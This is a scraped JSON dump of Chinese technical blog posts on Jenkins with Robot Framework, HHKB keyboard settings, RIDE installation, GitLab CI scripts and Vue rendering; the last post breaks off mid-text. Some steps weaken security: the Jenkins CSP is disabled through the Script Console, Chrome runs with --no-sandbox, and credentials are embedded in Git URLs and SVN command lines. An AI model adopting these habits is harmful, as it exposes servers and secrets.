Chrome 版本 1 2 google-chrome -version Google Chrome 68.0.3440.84 安装 chromedriver chromedriver 的版本需要与 Chrome 版本相匹配。在 chromedriver 页面，找到匹配的驱动下载链接。\n1 2 3 wget https://chromedriver.storage.googleapis.com/2.41/chromedriver_linux64.zip unzip chromedriver_linux64.zip mv chromedriver /usr/bin/ tips: 如果没有将 chromedriver 文件放在 /usr/bin/ 目录下，执行测试用例时，会报错 WebDriverException: Message: 'chromedriver' executable needs to be in PATH. Please see https://sites.google.com/a/chromium.org/chromedriver/home。\n2. Jenkins 配置 2.1 安装 Jenkins 首先需要安装 JDK 环境，然后安装 Jenkins。 1 2 3 wget -O /etc/yum.repos.d/jenkins.repo https://pkg.jenkins.io/redhat-stable/jenkins.repo rpm --import https://pkg.jenkins.io/redhat-stable/jenkins.io.key yum install jenkins 新增 runner 分组和 runner 用户 1 2 groupadd -g 1234 runner useradd runner -u 1234 -g 1234 修改配置文件 /etc/sysconfig/jenkins\n1 2 3 JENKINS_HOME=\u0026#34;/data/runner\u0026#34; JENKINS_USER=\u0026#34;runner\u0026#34; JENKINS_PORT=\u0026#34;8080\u0026#34; 启动 Jenkins 访问 http://127.0.0.1:8080/ 页面：\n1 2 3 4 5 6 Unlock Jenkins To ensure Jenkins is securely set up by the administrator, a password has been written to the log (not sure where to find it?) and this file on the server: /home/runner/secrets/initialAdminPassword Please copy the password from either location and paste 根据页面提示，cat /home/runner/secrets/initialAdminPassword 找到密码。然后，建议直接安装 Jenkins 推荐的插件，点击 Install suggested plugins。\n2.1 安装 robotframework 插件 在 Manage Jenkins \u0026gt; Plugin Manager 页面，选择 Avaliable 标签。搜索 robot，安装插件 Robot Framework plugin 。\n最后别忘了重启 Jenkins ，以使插件生效。\n3. 流水线配置 Jenkins 新建一个名为 robot-framework-demo 的 Freetyle project 代码管理选择 - Git 类型，输入：https://github.com/shaowenchen/docker-robotframework.git 。在仓库中，写了一个简单的 Robot Framework 测试用例，实现对网站首页测试截图的功能。 在 Build 中，Add build step 选择 Execute Shell，输入：/usr/bin/pybot .。 在 Post-build Actions 中，Add post buld step 选择 Publish Robot Framework test results 。点击 Advanced 展开更多选项，在 Others files to copy 中，输入 *.png。这是为了在 report.html 或者 log.html 中，看到截图。否则，测试用例截图，并不会被归档到指定位置。 安装 robot framework plugin 之后，在每次构建的详情中，就可以直接看到测试结果。 查看测试报告 report 查看测试日志 log 4. 问题与解决 Opening Robot Framework report/log failed 在 Manage Jenkins \u0026gt; Script Console 输入：\n1 System.setProperty(\u0026#34;hudson.model.DirectoryBrowserSupport.CSP\u0026#34;, \u0026#34;\u0026#34;) 点击运行。\n需要重新执行一次构建， 就可以查看 report.html 和 log.html。\nWebDriverException: Message: unknown error: DevToolsActivePort file doesn\u0026rsquo;t exist 在 Chrome 参数中新增 --no-sandbox --headless --disable-gpu 。如果不使用 Robot Framework ，在代码中:\n1 2 3 4 5 6 7 8 from selenium.webdriver.chrome.options import Options options = Options() options.add_argument(\u0026#39;--no-sandbox\u0026#39;) options.add_argument(\u0026#39;--headless\u0026#39;) options.add_argument(\u0026#39;--disable-gpu`\u0026#39;) driver = webdriver.Chrome(executable_path=\u0026#34;/usr/bin/chromedriver\u0026#34;, chrome_options=options) Selenium2Library . Capture Page Screenshot 截屏乱码 CentOS 安装中文字体\n1 yum install cjkuni-ukai-fonts cjkuni-uming-fonts wqy-zenhei-fonts -y 5. 参考 https://abekthink.github.io/test/robot-framework-tutorial-integration-jenkins/ ","description":"","id":442,"section":"post","tags":["博文","自动化","持续集成","测试","DevOps","Jenkins"],"title":"Jenkins 集成 Robot Framework 自动化测试","uri":"https://www.chenshaowen.com/blog/jenkins-integrated-robot-framework-testing.html"},{"content":"1. 关于键盘类型 键盘主要有三类：\n机械键盘 机械键盘的每一颗按键都有一个单独的开关，也被称为轴。依照微动开关的分类，机械键盘分为茶轴、青轴、白轴、黑轴以及红轴。机械键盘手感舒适，但价格偏高。\n薄膜键盘 薄膜键盘是按键较多且排列整齐有序的薄膜开关。日常家电的的控制面板很多都使用了薄膜开关。薄膜键盘价格便宜，耐操，就是手感差了点。\n静电容键盘 静电容键盘是利用电容容量的变化来判断按键的开和关。静电容键盘，什么都好，就是很贵。\n2. HHKB 简介 HHKB（全称 Happy Hacking Keyboard）是由株式会社 PFU（富士通的全资子公司）所经销的计算机键盘。键盘由和田英一和 PFU 研究所共同开发，于 1996 年 12 月开始销售。\n从名字看，这个键盘十分的 Hack 范儿。实际上，也是。整个键盘只有 60 个按键。\nHHKB 键盘取消了数字键、功能键和方向键等一般 PC 键盘都有，但非必要的按键，只由重要的最少按键组成。\n如果你的使用场景，经常需要使用到数字键、功能键、方向键，那么 HHKB 可能不适合你。\n3. 设计原则 键盘作为基本输入设备，乃人生涯所用之物，键盘布局不能像猫咪的眼睛那样，变来变去。 尽量减少按键的数目，以将其大小减少到可手持移动的程度 面向 Unix 程序员的按键键盘布局 4. 蓝牙配对 如果买的是有线版本，插上连接线，就可以直接使用了。\n蓝牙版 HHKB 需要设备已经配备蓝牙功能。有两种方式，可以激活蓝牙配对模式：\n长按电源键 2 s Fn + Q 使用设备连接键盘蓝牙，在键盘上输入设备显示的配对码，最后按下回车键连接。\n5. DIP 设置 5.1 调节步骤 键盘断电 调节 DIP 开关 键盘通电 5.2 DIP 配置位 HHKB 有一组 DIP 开关，可以在几种模式下切换。\n1-2 位配合使用配合操作系统 3-5 位用于修改键位 6 位为键盘的唤醒模式 5.3 1-2 号 DIP 开关 HHK 模式 - 适合 Linux\nSW1 SW2 MODE OFF OFF HHK 无 Win 按键 无法使用 Fn + H、J、N、M 输出 +-*/ 无法使用 Fn + 方块键 实现 CapsLock 可以使用 Fn + 方块键 实现 Stop 功能（停止媒体播放） Lite Ext 模式 - Windows、Android\nSW1 SW2 MODE ON OFF Lite Ext 方块键 = Win 键 可以使用 Fn + Tab 实现 CapsLock 除了 Fn + 方块键 不能实现 Stop 功能，其他均可实现 Macintosh 模式 - 适和 OS X 和 iOS\nSW1 SW2 MODE OFF ON Macintosh 方块键 = Command 键 可以使用 Fn + 按键上的斜体字体实现系统快捷键 5.4 3 号 DIP 开关 打开状态时，Delete 按键为 Delete\n关闭状态时，Delete 按键为 Backspace\n5.5 4 号 DIP 开关 打开之后，左边的方块键变成了 Fn 键\n5.6 5 号 DIP 开关 打开之后，Alt 键与方块键互换位置\n5.7 6 号 DIP 开关 6 号 DIP 开关叫唤醒开关，蓝牙版叫警觉开关。\n在开启状态下，可以通过键盘唤醒处于睡眠状态的电脑。而在关闭状态下则，不可以。\n蓝牙版，键盘在 30 分钟内无输入，为了省电，会自动进入关闭状态。可以通过按下键盘上的任意按键，或者长按电源开关来开启键盘。\n","description":"","id":443,"section":"post","tags":["博文","外设","键盘"],"title":"如何配置 HHKB 键盘","uri":"https://www.chenshaowen.com/blog/how-to-configure-the-hhkb-keyboard.html"},{"content":"1. 机器面前人人平等 我们每天都接受着大量的数字信息，但真正对自己有帮助的很少。绝大部分信息像垃圾食品一样，并不提供什么养分，还挤占容量，使你无法深入了解真相、形成自己的思考和判断。\n你可以一动不动，坐在那里刷一上午微博、抖音、今日头条、腾讯新闻。但第二天，问你昨天发生了什么事？这事是真是假？对自己有什么影响？你可能仍然一无所知。\n推荐算法决定了我们消费的数字内容。越来越多的信息被推荐给人，有价值的信息淹没在信息噪声中。Google 的推荐系统甚至可以主动去探测需要的用户指标信息。人，似乎成了被填食的动物。\n数字如此平坦，也亦如此无趣。\n2. 都可以，为什么是你 信息的趋同，让人没有专注的忠诚。都可以，成了大部人的选择，也成了被选择的大部分人。\n互联网让获取知识的门槛更低、成本更低。昨儿才听到的新名词，今天就能和朋友侃上一侃。别人深耕数年的技术，你学个一两星期也能掌握不少。\n但是，在同一起跑线上，当有事儿时，是什么让别人首先想到的是你？\n3. 差异化构成竞争力 一条消息的价值取决于事件发生的概率。如果是经常发生的，比如，你没中彩票，就谈不上什么价值。但，如果有人告诉你，你中了彩票。这种极小概率的事情才能称之为有价值的消息。\n一定是不一样的，才能快速被识别。\n对于人来说，如果你具备其他人不具备的能力，或者比其他人都深入的能力。那么你就是有价值的。\n这份有价值的能力构成了你在群体中竞争力的一方面。\n4. 定位 很多时候并不是我们不懂，而且懂了也做不好。\n恰当的定位，才能将自己营销出去。你可以考虑有关自己的方方面面，莫不是如此。\n定位就是要发现自己的比较优势，获取领域的标签，进入别人的心智，从而影响他的行为。\n5. 标签是什么 标签具有很强的指向性，不仅给其他人很直观的印象，同时也会影响自己努力的方向、未来的选择。\n这是一个正向积累，不断反馈加强的过程。标签的痕迹越深，你投入的就越多。你投入的越多，约有助于你成长为领域专家。\n","description":"","id":444,"section":"post","tags":["博文","思考","影响力"],"title":"没有标签的你，让人无法想起","uri":"https://www.chenshaowen.com/blog/no-tag-no-chance.html"},{"content":" 主要介绍 Robot Framework 的一些基本概念，如何写一个测试用例。\n1. 基础元素 1.1 关键字 - keywords Robot Framework 关键字类似函数。分为系统关键字和用户自定义关键字。\n系统关键字，通过加载 Library 引入 用户关键字，通过加载 Resource 引入 1.2 库 - Library 库用来封装和复用关键字。Robot Framework 库包括系统库和用户自定义库。\n系统库，如 XML、String 等 用户自定义库。单独安装的一些第三方库，如 seleniumlibrary 等。也可以是自己写的一些 Python 文件，比如 send_mail.py 等。 1.3 测试用例 - Test Case 按顺序组合的一些关键字与测试数据的集合，用于测试某个场景。若干个测试用例，构成一个测试套件。\n1.4 资源 - Resource 资源文件的整体结构和测试用例文件一样, 只不过其中不能包含测试用例。\n1.5 测试套件 - Test Suite 一个测试套件就是一个 txt 文件，里面包含多个测试用例，包括四个部分的内容。\nSetting Variable Test Case Keyword 1.6 变量 - Variable 变量有三种类型:\n标量 scalars，引用方式： ${SCALAR} 列表 lists，引用方式，@{LIST} 字典 dictionaries，引用方式：\u0026amp;{DICT} 此外，环境变量可以直接使用 %{ENV_VAR} 引用\n1.7 数据类型 字符串：${variable}，${test} 数值型：${80}，${1.2} 布尔值：${true}，${false} Null/None值：${None}，${null} 空格、Empty：${SPACE}，${EMPTY} 2. 目录结构 可以先在本地建立，下面结构的目录，然后使用 RIDE 打开项目文件即可：\n1 2 3 4 5 6 7 8 9 10 ProjectName |---cases |------ 测试套件 |--------- 测试用例 |---keywords （存放关键字） |------common.txt （通用关键字） |---res（附件资源文件夹，放图片、表格、文件等） |---global.txt（存放一些必须的全局变量） |---locators （存放页面上一些固定的元素，进行统一管理） |---lib （自己写的一些库 Python 库文件） 如果需要维护的变量、用例少，那么直接使用一个文本即可。\n如果需要维护大量变量、用户时，再将文件拆分为文件夹，在文件夹中创建各个模块的文件，进行维护。\n3. 开始写一个测试 3.1 一个测试用例的结构 一些初始化操作 对需要测试的页面进行一些测试操作 校验页面的表现是否符合预期 3.2 一个简单的测试用例 global.txt\n1 2 3 4 *** Variables *** ${site_url} http://xxxxx.com/ # 首页地址 ${username} myname # 用户名 ${password} password # 密码 为了方便维护，将全局变量，定义在单独的一个文件里面。\ncase/login.txt\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 *** Settings *** Resource ../global.txt *** Test Cases *** 登录 Open Browser ${site_url} gc Maximize Browser Window Wait Until Page Contains Element id=user Wait Until Element Is Visible id=user Input Text id=user ${username} Sleep 1 Wait Until Page Contains Element id=password Wait Until Element Is Visible id=password Input Text id=password ${password} Sleep 1 Wait Until Page Contains Element jquery=.login-btn Wait Until Element Is Visible jquery=.login-btn Click Element jquery=.login-btn Sleep 1 这是一个简单的测试用例，实现的功能是打开一个登陆链接，然后输入用户名和账户密码，最后登陆跳转。\n实际上，Robot Framework 支持 HTML、TSV、TXT、reST 等多种描述格式。不同的格式文件，Robot Framework 使用的解析器不同。\n以 TXT 为例。\n第一列表示的是测试用例名，意思是这个测试用例命名为 登陆。\n第二列，有两种情况，关键字或变量。上面提到，关键字是 Robot Framework 中的一等公民，可以理解为函数。函数分为有返回值和没有返回值的。如果使用的是有返回值的关键字，那么从第二列开始的若干列都可能被用于接受返回值，一直到遇到关键字为止。如果关键字没有返回值，则第二列就是需要使用的关键字。比如，这里的 Open Browser，Maximize Browser Window 都是关键字。\n关键字的后续列会作为参数传递给关键字。比如，这里的 id=password、${password} 等。\n3.3 如何使用关键字 看完上面的例子，你可能已经意思到，Robot Framework 里面关键字的重要性了。大量的操作都需要使用到关键字，同时，也需要封装自己的关键字。\n在 RIDE 中按 F5 可以看到内建和库的关键字，使用帮助文档。\n在 Web 自动化测试中，最常用的是 selenium2library 库中的关键字。\n4. 参考 https://github.com/davyyy/robotframework-userguide-cn http://www.cnblogs.com/farb/p/HowToWriteGoodTestCases.html http://robotframework-userguide-cn.readthedocs.io/zh_CN/latest/ http://robotframework.org/Selenium2Library/Selenium2Library.html ","description":"","id":445,"section":"post","tags":["博文","Python","测试","使用","DevOps"],"title":"Robot Framework 基础","uri":"https://www.chenshaowen.com/blog/basic-of-robot-framework.html"},{"content":"1. 简介 1.1 Robot Framework Robot Framework 是一个 Python 写的自动化功能测试框架。\n具备良好的可扩展性，支持关键字驱动 可以同时测试多种类型的客户端或者接口 可以进行分布式测试 主要用于轮次很多的验收测试和测试驱动开发。\n1.2 Robot Framework IDE (RIDE) Robot Framework IDE (RIDE) 是 Robot Framework 框架的集成开发环境。\n值得注意的是，2016 年 03 月 12 日至今，robotframework/RIDE ，没有新的提交记录。当然，你可以试试其他分支版本， 比如，HelioGuilherme66/RIDE。\n2. 安装依赖包 安装 Python 环境 由于目前 robotframework-ride (1.5.2.1) 不支持 Python3 ，建议使用 Python 2.7 的版本。别忘了将 Python 的安装路径添加到 PATH 中，set path=%path%;c:\\python27;c:\\python27\\Scripts（以安装目录为 c:\\python27 为例）。\n前往下载\n安装 robot framework 1 pip install robotframework 安装 robot framework ride 1 pip install robotframework-ride 安装必要的 library 1 2 3 4 5 pip install robotframework-selenium2library pip install robotframework-archivelibrary pip install robotframework-SSHLibrary pip install robotframework-ftplibrary pip install robotframework-excellibrary 安装 wxPython wxPython 是跨平台的、开源的 GUI 工具包 ，作为 Python 的扩展模块实现，包装了 wxWidgets。\n由于 robotframework 的版本不同，可能会导致依赖的 wxPython 版本有差别。\n建议，先在 Console 里面执行 ride.py 命令。\n1 2 3 4 ride.py wxPython not found. You need to install wxPython 2.8.12.1 with unicode support to run RIDE. wxPython 2.8.12.1 can be downloaded from http://sourceforge.net/projects/wxpython/files/wxPython/2.8.12.1/ 由于没有安装 wxPython ，终端会提示错误，显示当前 robotframework 需要的 wxPython 版本号。\n除了版本号，还需要注意安装与 Python 位数相同的版本，32 位 或者 64 位。\n使用如下命令，可以快速确定当前 Python 版本是 32 位，还是 64 位。\n1 2 3 4 ipython \u0026gt;\u0026gt;\u0026gt; import platform \u0026gt;\u0026gt;\u0026gt; platform.architecture() (\u0026#39;32bit\u0026#39;, \u0026#39;WindowsPE\u0026#39;) 然后，去 wxPython官网 或者 sourceforge 下载合适版本（指定的版本号）和位数（32 位或者 64 位）的 unicode 版本，安装到 \\python\\Lib\\site-packages 即可。\n由于使用 pip 没有带版本号全新安装，默认安装的是最新版本。下面是我本地的版本号，以供参考：\n1 2 3 4 5 6 7 8 9 pip list robotframework (3.0.4) robotframework-archivelibrary (0.4.0) robotframework-ftplibrary (1.6) robotframework-ride (1.5.2.1) robotframework-selenium2library (3.0.0) robotframework-seleniumlibrary (3.1.1) robotframework-sshlibrary (3.1.0) robotframework-excellibrary(0.0.2) 3. 运行 在任意终端，输入 ride.py，就能看的 RIDE 的界面了。\n如果，上面的启动方式报错，可以尝试进入到 ride.py 的文件目录 python\\scripts，执行 python ride.py。\n4. 问题与解决 4.1 \u0026lsquo;ascii\u0026rsquo; codec can\u0026rsquo;t decode byte 0xd7 错误提示：\n1 Unexpected error: UnicodeDecodeError: \u0026#39;ascii\u0026#39; codec can\u0026#39;t decode byte 0xd7 in position 69: ordinal not in range(128) 解决办法：\n在 Python 的安装目录 Lib 文件夹下新建 sitecustomize.py 文件。内容如下：\n1 2 3 import sys reload(sys) sys.setdefaultencoding(\u0026#39;gbk\u0026#39;) # Windows 下 Python 默认的系统编码为 ASCII 编码，会导致中文路径无法识别，需要将默认编码方式改成 gbk(Windows)，或者 utf8（Linux）。\n4.2 python cannot found robot robotframework 依赖于 robot 包。但是，如果你之前安装过 robot ，就会导致 robotframework 配置不对，找不到 robot。\n建议将 python\\Lib\\site-packages 目录下，全部 robot 开头的包，全部删掉。再重新安装一次解决，这样比较简单、直接。\n4.3 WebDriverException 错误提示：\n1 WebDriverException: Message: \u0026#39;chromedriver\u0026#39; executable needs to be in PATH. Please see https://sites.google.com/a/chromium.org/chromedriver/home 解决办法：\n通常是驱动版本与浏览器版本不相符，或者找不到驱动导致的。\n前往提示的地址链接，或者 selenium 驱动列表页面 下载与本地浏览器版本相匹配的驱动，并将驱动加入环境变量 PATH 中。\n5. 参考 http://robotframework.org/ https://www.ibm.com/developerworks/cn/opensource/os-cn-robot-framework/index.html https://www.jianshu.com/p/f15fe7386781 ","description":"","id":446,"section":"post","tags":["博文","测试","功能","Python","RIDE"],"title":"Robot Framework IDE (RIDE) 安装","uri":"https://www.chenshaowen.com/blog/how-to-install-robot-framework-ide-on-windows.html"},{"content":" 由于负责小组的 CI 公共事项，经常需要配置 CI 流程，或者帮助其他人解决一些问题，整理了一下常用的 CI 脚本，以方便查阅。\n1. .gitlab-ci.yml 结构 下面是， GitLab CI 的配置文件结构。\n.gitlab-ci.yml 文件\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 # 一些前置脚本，完成激活环境等操作 before_script: - source /data/runner/node/bin/activate - which node \u0026amp;\u0026amp; node --version - which npm \u0026amp;\u0026amp; npm --version - LANG=\u0026#34;zh_CN.utf8\u0026#34; - export LC_ALL=zh_CN.UTF-8 # 编排需要执行的 stage stages: - build - deploy # 定义 job。job 属于某一个 stage，比如这里的 build 、deploy。GitLab CI 会按照 stages 配置的先后，顺序执行每一个 stage。 2. 编译 Webpack 工程并提交到 GitLab 仓库 这里约定：\n前端工程在根目录的 webpack 目录下 前端工程编译之后的输出文件在根目录的 static/dist 目录下 前端的编译命令是 npm run build GitLab CI 内置变量可以去 这里 查看。也可以，使用关键字 variables 定义自己的变量。比如，上面的目录路径，就可以配置为变量。但是每个项目有其独特性，这里就没有写成通用的形式，避免误导。\n通常，我会将一些账户信息配置在 settings/ci_cd 页面，并将这些变量勾选保护。勾选保护之后，只有受保护的分支才能够获取到这些变量，也就是下面的 GIT_USERNAME、GIT_PASSWORD 这部分。\n这里强烈建议，不要直接在当前代码目录直接提交 Git，应该将代码重新拉一份到本地，以保证环境不被污染。\n.gitlab-ci.yml 文件，\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 stages: - build build-webpack: stage: build variables: CI_REPOSITORY_URL: http://$GIT_USERNAME:$GIT_PASSWORD@gitlab.yourdomain.com/$CI_PROJECT_PATH.git cache: untracked: true paths: - webpack/node_modules script: - echo \u0026#34;start build and commit\u0026#34; - cd webpack # 可通过关键字优化 - npm install # 可通过关键字优化 - npm run build - cd .. - rm -rf git-dir - git clone -b $CI_COMMIT_REF_NAME http://$GIT_USERNAME:$GIT_PASSWORD@gitlab.yourdomain.com/$CI_PROJECT_PATH.git git-dir - cd git-dir \u0026amp;\u0026amp; rm -rf ./static/dist - mv ../static/dist static/ - git config --global user.name $GITLAB_USER_NAME - git config --global user.email $GITLAB_USER_EMAIL - git add static/dist # 避免循环构建 - git commit -m \u0026#34;auto commit [ci skip]`git log -1 --pretty=%B`\u0026#34; || exit 0 - git push $CI_REPOSITORY_URL $CI_COMMIT_REF_NAME \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 || exit 0 - echo \u0026#34;end build and commit\u0026#34; tags: # 指定 runner - linux - shell only: # 指定分支 - master 3. 从 GitLab 推送代码到 SVN 仓库 由于发布系统采用的是 SVN 仓库，但是 Git 更适合多人开发协助，在开发的过程中使用的是 GitLab 仓库。\n为了将 GitLab 仓库自动推送到 SVN 仓库，可以使用下面这个 job:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 push-to-svn: stage: deploy variables: CI_REPOSITORY_URL: http://$GIT_USERNAME:$GIT_PASSWORD@gitlab.yourdomain.com/$CI_PROJECT_PATH.git script: - echo \u0026#34;start push to svn\u0026#34; - echo \u0026#34;step 1/3: git clone\u0026#34; - git clone -b $CI_COMMIT_REF_NAME $CI_REPOSITORY_URL git-dir - echo \u0026#34;finished\u0026#34; - echo \u0026#34;setp 2/3: svn checkout\u0026#34; - echo \u0026#39;t\u0026#39; | svn checkout $SVN_PATH svn-dir --username $SVN_USERNAME --password $SVN_PASSWORD --no-auth-cache - echo \u0026#34;finshed\u0026#34; - echo \u0026#34;step 3/3: push git master to svn trunk\u0026#34; # 确保删除文件操作有效，可优化 - cd svn-dir \u0026amp;\u0026amp; svn delete * - rsync -avq git-dir/ svn-dir/ - cd ./svn-dir - svn add * --force - echo \u0026#39;t\u0026#39; | svn commit -m \u0026#34;`git log -1 --pretty=%B`\u0026#34; --username $SVN_USERNAME --password $SVN_PASSWORD --no-auth-cache - echo \u0026#34;end push to svn\u0026#34; 4. 通过关键字控制执行的脚本 GitLab CI 提供了一些内置关键字用于控制 CI 的行为。比如，在提交信息中增加 [ci skip] 或 [skip ci] 就会跳过当次提交触发的 CI 构建。\n受到这种想法的启发，我们也可以在脚本中，从提交信息中匹配一些关键字，用于控制脚本执行逻辑。\n通过是否有关键字 [install] ，判断是否执行依赖包的安装 1 if [[ $(git log -1 --pretty=%B) = *\u0026#34;[\u0026#34;*\u0026#34;install\u0026#34;*\u0026#34;]\u0026#34;* ]]; then npm install; else echo \u0026#34;not npm install\u0026#34;; fi; 通过是否有关键字 [build] ，判断是否进行前端的打包 1 if [[ $(git log -1 --pretty=%B) = *\u0026#34;[\u0026#34;*\u0026#34;build\u0026#34;*\u0026#34;]\u0026#34;* ]]; then npm run build; else echo \u0026#34;not npm install\u0026#34;; fi; 通过是否有关键字 [delete] ，判断在执行 SVN 推送时，是否需要删除文件。这里主要是由于 svn add * 命令不能将删除的文件提交，删除文件必须使用 svn delete 处理。如果不使用 svn delete 命令，会导致 GitLab 中被删除的文件，在 SVN 中实际上没有被删除。 1 if [[ $(git log -1 --pretty=%B) = *\u0026#34;[\u0026#34;*\u0026#34;delete\u0026#34;*\u0026#34;]\u0026#34;*]]; then cd svn-dir \u0026amp;\u0026amp; svn delete * \u0026amp;\u0026amp; cd ..; else echo \u0026#34;not svn delete\u0026#34;; fi; 5. 从 yml 获取变量 yml 文件格式：\n1 2 3 4 code: test name: 测试 author: admin version: 1.2.3 以上面的 yml 格式为例，需要获取相关字段信息。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 parse_yaml() { local prefix=$2 local s=\u0026#39;[[:space:]]*\u0026#39; w=\u0026#39;[a-zA-Z0-9_]*\u0026#39; fs=$(echo @|tr @ \u0026#39;\\034\u0026#39;) sed -ne \u0026#34;s|^\\($s\\)\\($w\\)$s:$s\\\u0026#34;\\(.*\\)\\\u0026#34;$s\\$|\\1$fs\\2$fs\\3|p\u0026#34; \\ -e \u0026#34;s|^\\($s\\)\\($w\\)$s:$s\\(.*\\)$s\\$|\\1$fs\\2$fs\\3|p\u0026#34; $1 | awk -F$fs \u0026#39;{ indent = length($1)/2; vname[indent] = $2; for (i in vname) {if (i \u0026gt; indent) {delete vname[i]}} if (length($3) \u0026gt; 0) { vn=\u0026#34;\u0026#34;; for (i=0; i\u0026lt;indent; i++) {vn=(vn)(vname[i])(\u0026#34;_\u0026#34;)} printf(\u0026#34;%s%s%s=\\\u0026#34;%s\\\u0026#34;\\n\u0026#34;, \u0026#34;\u0026#39;$prefix\u0026#39;\u0026#34;,vn, $2, $3); } }\u0026#39; } eval $(parse_yaml test.yml \u0026#34;config_\u0026#34;) 通过执行上面的脚本，可以获取到 test.yml 中的字段信息。\n1 2 3 echo ${config_code} echo ${config_name} ... 6. 将环境变量值，写到 yml 文件 yml 文件格式：\n1 2 3 4 code: test name: 测试 author: admin version: 1.2.3 以上面的 yml 格式为例，获取环境变量中的 VER 值，并将其写到 version: 后面中。\n1 sed -i \u0026#34;/version:/s/[0-9].*$/${VER}/g\u0026#34; test.yml ","description":"","id":447,"section":"post","tags":["博文","GitLab","CI","DevOps","持续集成"],"title":"常用的一些 CI 脚本","uri":"https://www.chenshaowen.com/blog/some-common-scripts-in-ci.html"},{"content":"作者: [美] 爱德华·弗伦克尔\n原标题: Love and Math: The Heart of Hidden Reality\n出版年: 2016-3\nISBN: 9787508658070\nNotes:\n在来回旅途的高铁上，读完本书的。这是一本比较轻松的自传类型的数学读物。主要以作者求学为时间线，讲述了一个对物理感兴趣的男孩，怎样一步一步、通过不懈努力成为世界级的数学家的故事。\n阅读本书，你可以在教育子女、人生选择、数学知识方面获取一定的启示。\n","description":"","id":448,"section":"post","tags":["书籍","数学"],"title":"爱与数学","uri":"https://www.chenshaowen.com/blog/book/love-and-math.html"},{"content":"1. createElement 方法 HTML 中常见的 DOM 操作是，修改 DOM 节点，访问 DOM 节点。\n除此之外，W3C 还发布了创建 DOM 节点、删除 DOM 节点的技术标准。\ncreateElement 方法，被用于创建一个 DOM 节点。createElement() 通常需要与 appendChild() 或 insertBefore() 方法配合使用。\n其中:\nappendChild() 方法，用来在指定的子节点列表末，插入新的节点。 insertBefore() 方法，用来在指定的已有子节点之前，插入新的节点。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=\u0026#34;parentElement\u0026#34;\u0026gt; \u0026lt;span id=\u0026#34;childElement\u0026#34;\u0026gt;子节点\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;button onclick=\u0026#34;myFunction()\u0026#34;\u0026gt;点我新增子节点\u0026lt;/button\u0026gt; \u0026lt;script\u0026gt; function myFunction(){ var btn = document.createElement(\u0026#34;BUTTON\u0026#34;); var text = document.createTextNode(\u0026#34;新增加的按钮\u0026#34;); btn.appendChild(text); var exist_node = document.getElementById(\u0026#34;childElement\u0026#34;); document.getElementById(\u0026#34;parentElement\u0026#34;).insertBefore(btn, exist_node); //window.document.body.appendChild(btn); }; \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 2. Vue 自定义渲染 在 Vue 中有两种渲染页面的写法：\n1 2 3 4 5 6 7 8 9 10 11 // 使用 template new Vue({ template: \u0026#39;\u0026lt;div\u0026gt;{{ hi }}\u0026lt;/div\u0026gt;\u0026#39; }) // 使用 render 方法 new Vue({ render (h) { return h(\u0026#39;div\u0026#39;, this.hi) } }) 实际上，在 Vue 调用 mounted 方法时，会将 template 编译成 render 方法。使用 template 的渲染效率没有使用 render 效率高。\nVue 的渲染与 W3C 的 createElement 方法功能上类似。Vue 中也有 createElement 方法。不同于 W3C 的 createElement 方法，Vue 中的 createElement 方法不是直接对 DOM 进行操作，而是操作 VNode。\n3. Vue 中的 h 方法 Vue 中的 h 方法是 createElement 方法的缩写。\n首先分析一下，Vue 中是如何渲染的：\nVue 中使用 _render 将一个实例渲染成 VNode。在 _render 中主要的处理逻辑是：\n1 vnode = render.call(vm._renderProxy, vm.$createElement) 可以看到，Vue 将 vm.$createElement 传递给了 render 方法。而 createElement 方法又是对 _createElement 方法的封装。\n1 2 3 4 5 6 7 _createElement ( context: Component, tag?: string | Class\u0026lt;Component\u0026gt; | Function | Object, data?: VNodeData, children?: any, normalizationType?: number ) 这里的 context 是 VNode 的上下文环境。这样就能理解 createElement 方法或者说 h 方法的参数列表了。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 // @returns {VNode} createElement( // {String | Object | Function} // 一个 HTML 标签字符串，组件选项对象，或者 // 解析上述任何一种的一个 async 异步方法，必要参数。 \u0026#39;div\u0026#39;, // {Object} // 一个包含模板相关属性的数据对象 // 这样，您可以在 template 中使用这些属性。可选参数。 { // (详情见下一节) }, // {String | Array} // 子节点 (VNodes)，由 `createElement()` 构建而成， // 或使用字符串来生成“文本节点”。可选参数。 [ \u0026#39;先写一些文字\u0026#39;, createElement(\u0026#39;h1\u0026#39;, \u0026#39;一则头条\u0026#39;), createElement(MyComponent, { props: { someProp: \u0026#39;foobar\u0026#39; } }) ] ) 4. 参考 https://cn.vuejs.org/v2/guide/render-function.html https://ustbhuangyi.github.io/vue-analysis/ ","description":"","id":449,"section":"post","tags":["博文","前端","Vue","函数"],"title":"Vue 中的 h 函数","uri":"https://www.chenshaowen.com/blog/h-function-in-vue.html"},{"content":"1. 提问的动机 提问的动机分为两种，被动型、主动型。\n2 被动型 被动型的提问，是当你遇到问题之后，寻找问题的解法而不得时，被迫的行为。\n2.1 尝试自己解决 遇到问题时，不要着急问别人。在时间允许的情况下，尝试自己解决。\n一方面，可以锻炼自己分析问题和解决问题的能力。另一方面，一旦问题解决了，问题就不再是问题，而是自己的经验和知识库。\n2.2 善用知识库 问题，不会是一个孤立的，而是具有一定的背景和上下文关系。结合问题的背景，能够找到一些类似 Q\u0026amp;A 或者 wiki 的文档。在这些文档中，通常能准确的给出问题的答案或者相关提示。\n2.3 善用搜索 如果条件允许，请使用 google 。\n下面是使用 google 搜索的一些技巧：\n使用 \u0026quot;\u0026quot; 进行完全匹配 使用 * 进行模糊匹配 使用 site:\u0026quot; 指定网站 使用 - 排除关键字 3 好的提问 3.1 